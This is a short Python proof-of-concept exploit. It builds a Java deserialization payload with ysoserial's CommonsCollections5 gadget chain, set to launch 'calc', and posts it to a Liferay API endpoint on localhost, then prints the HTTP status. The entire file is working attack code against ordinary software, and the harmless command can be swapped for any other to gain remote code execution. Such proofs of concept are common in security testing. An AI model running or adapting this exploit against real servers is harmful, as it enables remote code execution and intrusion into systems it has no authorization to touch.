import requests

from subprocess import check_output
o=check_output("java -jar ysoserial.jar CommonsCollections5 calc", shell=True)
res=requests.post('http://localhost:8080/api/liferay',data=o)
print(res.status_code)

